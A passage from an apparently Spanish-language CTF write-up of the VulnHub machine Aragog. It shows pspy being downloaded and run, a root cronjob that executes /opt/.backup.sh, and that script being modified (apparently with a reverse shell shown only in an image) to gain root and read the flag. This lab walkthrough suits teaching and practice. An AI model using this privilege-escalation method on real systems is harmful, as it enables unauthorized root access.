</span></span><span style="display:flex;"><span>Length: <span style="color:#bd93f9">3104768</span> <span style="color:#ff79c6">(</span>3.0M<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">[</span>application/octet-stream<span style="color:#ff79c6">]</span>
</span></span><span style="display:flex;"><span>Saving to: ‘pspy64’
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pspy64                         100%<span style="color:#ff79c6">[==================================================</span>&gt;<span style="color:#ff79c6">]</span>   2.96M  --.-KB/s    in 0.03s   
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>2024-03-30 00:46:45 <span style="color:#ff79c6">(</span><span style="color:#bd93f9">117</span> MB/s<span style="color:#ff79c6">)</span> - ‘pspy64’ saved <span style="color:#ff79c6">[</span>3104768/3104768<span style="color:#ff79c6">]</span>
</span></span><span style="display:flex;"><span>hagrid98@Aragog:/tmp$ chmod +x pspy64
</span></span><span style="display:flex;"><span>hagrid98@Aragog:/tmp$ ls
</span></span><span style="display:flex;"><span>pspy64
</span></span><span style="display:flex;"><span>hagrid98@Aragog:/tmp$ ./pspy64
</span></span></code></pre></div><h2 id="monitoreo-de-cronjobs-con-pspy">Monitoreo de cronjobs con pspy</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>2024/03/30 00:50:01 CMD: <span style="color:#8be9fd;font-style:italic">UID</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">0</span>     <span style="color:#8be9fd;font-style:italic">PID</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">2367</span>   | /bin/sh -c bash -c <span style="color:#f1fa8c">&#34;/opt/.backup.sh&#34;</span> 
</span></span><span style="display:flex;"><span>2024/03/30 00:50:01 CMD: <span style="color:#8be9fd;font-style:italic">UID</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">0</span>     <span style="color:#8be9fd;font-style:italic">PID</span><span style="color:#ff79c6">=</span><span style="color:#bd93f9">2368</span>   | /bin/bash /opt/.backup.sh
</span></span></code></pre></div><h2 id="modificación-de-archivo-optbackupsh">Modificación de archivo /opt/.backup.sh</h2>
<p><img src="/images/writeups/vulnhub/aragog/backuprevshell.png" alt="Modificación de script"></p>
<h2 id="flag-del-usuario-root">Flag del usuario root</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@Aragog:/# <span style="color:#8be9fd;font-style:italic">cd</span> root
</span></span><span style="display:flex;"><span>root@Aragog:~# ls
</span></span><span style="display:flex;"><span>horcrux2.txt
</span></span><span style="display:flex;"><span>root@Aragog:~# cat horcrux2.txt
</span></span><span style="display:flex;"><span>  ____                            _         _       _   _                 
</span></span><span style="display:flex;"><span> / ___|___  _ __   __ _ _ __ __ _| |_ _   _| | __ _| |_<span style="color:#ff79c6">(</span>_<span style="color:#ff79c6">)</span> ___  _ __  ___ 
</span></span><span style="display:flex;"><span>| |   / _ <span style="color:#f1fa8c">\|</span> <span style="color:#f1fa8c">&#39;_ \ / _` | &#39;</span>__/ _<span style="color:#f1fa8c">`</span> | __| | | | |/ _<span style="color:#f1fa8c">`</span> | __| |/ _ <span style="color:#f1fa8c">\|</span> &#39;_ <span style="color:#f1fa8c">\/</span> __|
</span></span><span style="display:flex;"><span>| |__| <span style="color:#ff79c6">(</span>_<span style="color:#ff79c6">)</span> | | | | <span style="color:#ff79c6">(</span>_| | | | <span style="color:#ff79c6">(</span>_| | |_| |_| | | <span style="color:#ff79c6">(</span>_| | |_| | <span style="color:#ff79c6">(</span>_<span style="color:#ff79c6">)</span> | | | <span style="color:#f1fa8c">\_</span>_ <span style="color:#f1fa8c">\
</span></span></span><span style="display:flex;"><span><span style="color:#f1fa8c"></span> <span style="color:#f1fa8c">\_</span>___<span style="color:#f1fa8c">\_</span>__/|_| |_|<span style="color:#f1fa8c">\_</span>_, |_|  <span style="color:#f1fa8c">\_</span>_,_|<span style="color:#f1fa8c">\_</span>_|<span style="color:#f1fa8c">\_</span>_,_|_|<span style="color:#f1fa8c">\_</span>_,_|<span style="color:#f1fa8c">\_</span>_|_|<span style="color:#f1fa8c">\_</span>__/|_| |_|___/
</span></span><span style="display:flex;"><span>                  |___/                                                   
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Machine Author: Mansoor R <span style="color:#ff79c6">(</span>@time4ster<span style="color:#ff79c6">)</span>
</span></span><span style="display:flex;"><span>Machine Difficulty: Easy
</span></span><span style="display:flex;"><span>Machine Name: Aragog 
</span></span><span style="display:flex;"><span>Horcruxes Hidden in this VM: <span style="color:#bd93f9">2</span> horcruxes
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>You have successfully pwned Aragog machine.
</span></span><span style="display:flex;"><span>Here is your second hocrux: horcrux_<span style="color:#ff79c6">{</span><span style="color:#8be9fd;font-style:italic">MjogbWFSdm9MbyBHYVVudCdzIHJpTmcgZGVTdHJPeWVkIGJZIERVbWJsZWRPcmU</span><span style="color:#ff79c6">=}</span>
</span></span></code></pre></div><blockquote>
<p>lYou have successfully pwned Aragog machine.
Here is your second hocrux: horcrux_
{MjogbWFSdm9MbyBHYVVudCdzIHJpTmcgZGVTdHJPeWVkIGJZIERVbWJsZWRPcmU=}</p>
</blockquote>

</div>


<footer>
<a class="footer-github" href='https://github.com/jfbfafi' target='_blank' rel='noreferrer'>
	<svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24"><path fill="#50fa7b" d="M12 2A10 10 0 0 0 2 12c0 4.42 2.87 8.17 6.84 9.5c.5.08.66-.23.66-.5v-1.69c-2.77.6-3.36-1.34-3.36-1.34c-.46-1.16-1.11-1.47-1.11-1.47c-.91-.62.07-.6.07-.6c1 .07 1.53 1.03 1.53 1.03c.87 1.52 2.34 1.07 2.91.83c.09-.65.35-1.09.63-1.34c-2.22-.25-4.55-1.11-4.55-4.92c0-1.11.38-2 1.03-2.71c-.1-.25-.45-1.29.1-2.64c0 0 .84-.27 2.75 1.02c.79-.22 1.65-.33 2.5-.33s1.71.11 2.5.33c1.91-1.29 2.75-1.02 2.75-1.02c.55 1.35.2 2.39.1 2.64c.65.71 1.03 1.6 1.03 2.71c0 3.82-2.34 4.66-4.57 4.91c.36.31.69.92.69 1.85V21c0 .27.16.59.67.5C19.14 20.16 22 16.42 22 12A10 10 0 0 0 12 2"/>
	</svg>
</a>

<a class="footer-linkedin" href='https://www.linkedin.com/in/juan-fafi-burgos/' target='_blank' rel='noreferrer'>

	<svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24">
		<path fill="#50fa7b" d="M19 3a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2zm-.5 15.5v-5.3a3.26 3.26 0 0 0-3.26-3.26c-.85 0-1.84.52-2.32 1.3v-1.11h-2.79v8.37h2.79v-4.93c0-.77.62-1.4 1.39-1.4a1.4 1.4 0 0 1 1.4 1.4v4.93zM6.88 8.56a1.68 1.68 0 0 0 1.68-1.68c0-.93-.75-1.69-1.68-1.69a1.69 1.69 0 0 0-1.69 1.69c0 .93.76 1.68 1.69 1.68m1.39 9.94v-8.37H5.5v8.37z" />
	</svg>
</a>


</footer>

